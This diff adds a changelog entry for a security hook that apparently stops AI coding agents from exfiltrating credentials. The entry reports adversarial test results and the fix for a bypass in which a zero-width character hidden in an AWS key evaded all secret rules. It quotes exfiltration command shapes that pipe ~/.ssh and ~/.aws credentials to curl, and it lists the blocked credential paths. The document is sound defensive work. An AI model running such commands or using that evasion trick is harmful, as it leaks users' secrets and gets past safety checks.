@@ -3,6 +3,53 @@
 All notable changes to Sunglasses are documented here.
 
 
+## [0.4.1] — 2026-08-12
+
+Three fixes from an adversarial pass run against the **published 0.4.0 wheel**
+(clean venv, PyPI install, hook driven over stdin the way Claude Code drives it)
+a few hours after 0.4.0 went out. 127 checks: 15/15 credential-exfil attempts
+blocked, 0/27 false positives on ordinary dev work, 11/11 malformed-input cases
+failed open without wedging the agent. What follows is what did *not* hold.
+
+### Fixed
+
+- **A zero-width character inside a credential defeated all nine secret rules.**
+  One `U+200B` in `AKIA…` split the token and every rule missed it, while the
+  key still arrived usable at the far end. The material was in the tool call the
+  whole time — this was a hole in the detector, not the documented "we see the
+  call, not the file behind it" limit. Format characters (Unicode Cf) are now
+  stripped before matching, which cannot change what a real credential is and
+  cannot invent one, so the "only block provable facts" rule is untouched. The
+  fingerprint of a smuggled key now matches the fingerprint of the same key sent
+  plainly, so two receipts of one leak correlate. 42 new parametrised cases.
+
+### Added
+
+- **`sunglasses init` now offers the recommended credential-path blocks.** The
+  sharpest finding in the pass was not a bug: `blocked_paths` already stops
+  `cat ~/.ssh/id_rsa | curl -d @-` and `curl -d @~/.aws/credentials` — the shape
+  a compromised agent is far likelier to take than pasting a key inline — and it
+  stopped none of them in the wild, because the default policy is empty and the
+  file was undiscoverable. The strongest control in the product shipped switched
+  off. `init` now asks; answering yes writes `~/.sunglasses/policy.yaml` with the
+  private key files, `~/.aws`, `~/.config/gcloud`, `~/.kube/config`,
+  `~/.docker/config.json`, `~/.netrc`, `~/.npmrc`, `~/.pypirc`. `--policy`
+  enables without prompting, `--no-policy` skips the file entirely, and a
+  non-interactive run writes the rules **commented out** — silence is not
+  consent, and "a fresh install blocks nothing you did not ask for" still holds.
+  An existing `policy.yaml` is never overwritten. Measured with the rules on:
+  5/5 exfil shapes blocked, **0 false positives** across `ssh-copy-id`,
+  `known_hosts`, `~/.ssh/config`, `git push`, `aws s3 ls`, `docker build`,
+  `kubectl`, `npm ci` and `curl https://pypi.org`.
+
+### Docs
+
+- The v0.4.0 demo evidence file had two sections headed "HOOK BLOCK DEMO" whose
+  actual output was `"permissionDecision": "defer"`. The block it showed was
+  real; the labels were not. Regenerated from live runs with every section
+  headed by what actually happened.
+
+
 ## [0.4.0] — 2026-08-12
 
 ### When this code actually reached you
